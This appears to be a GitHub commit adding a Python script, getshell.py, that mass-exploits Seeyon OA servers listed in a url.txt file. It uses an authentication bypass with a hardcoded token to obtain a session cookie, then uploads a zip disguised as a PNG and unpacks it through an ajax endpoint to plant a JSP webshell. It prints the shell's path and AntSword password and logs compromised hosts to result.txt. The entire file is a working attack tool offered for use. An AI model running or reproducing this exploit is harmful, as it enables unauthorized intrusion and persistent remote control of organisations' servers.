78d71fd08b517d1f4e3699f4480758125c06a45b
weizike <74318732+weizike@users.noreply.github.com>
2021-08-08 06:24:09 +0800

    Add files via upload

---
+++ getshell.py
@@ -0,0 +1,81 @@
+# coding: utf-8
+import requests
+import sys
+import random
+import time
+import re
+import os
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+url="/seeyon/common/designer/pageLayout/test10086.jsp\n"
+result=""
+flag=0
+
+def POC_1(target_url):
+    vuln_url = target_url + "/seeyon/thirdpartyController.do"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
+        if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(response.headers).lower():
+            cookies = response.cookies
+            cookies = requests.utils.dict_from_cookiejar(cookies)
+            cookie = cookies['JSESSIONID']
+            targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload'
+            print("\033[32m[o] 目标 {} 正在上传压缩包文件.... \n[o] Cookie: {} \033[0m".format(target_url, cookie))
+            files = [('file1', ('360icon.png', open('shell.zip', 'rb'), 'image/png'))]
+            headers = {'Cookie':"JSESSIONID=%s" % cookie}
+            data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0','isEncrypt': "0"}
+            response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False)
+            reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
+            if len(reg)==0:
+                print("上传文件失败")
+            POC_2(target_url, cookie, reg, headers)
+
+        else:
+            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
+    except Exception as e:
+        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url),e)
+
+def POC_2(target_url, cookie, reg, headers):
+    vuln_url = target_url + '/seeyon/ajax.do'
+    datestr = time.strftime('%Y-%m-%d')
+    post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + reg[0] + '%22%5D'
+
+    headers['Content-Type']="application/x-www-form-urlencoded"
+    print("\033[32m[o] 目标 {} 正在解压文件.... \033[0m".format(target_url))
+    try:
+        response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
+        if response.status_code == 500:
+            print("\033[32m[o] 目标 {} 解压文件成功.... \033[0m".format(target_url))
+            print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/test10086.jsp \033[0m".format(target_url))
+            print("\033[32m[o] 蚁剑密码: test \033[0m".format(target_url))
+            print("\033[32m[o] 如果目标webshell无法访问，请更换 shell.zip 中的木马名称 \033[0m".format(target_url))
+            global flag
+            flag=1
+        else:
+                print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
+    except Exception as e:
+        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url),e)
+        
+        
+
+	    
+
+f = open("url.txt")
+for target_url in f.readlines():
+    target_url=target_url.strip()
+    str(target_url)
+    flag=0
+    POC_1(target_url)
+    if flag== 1:
+        result=target_url+url
+        f2 = open("result.txt",'a')
+        f2.write(result)
+        f2.close()
+    else :
+        continue
+f.close()
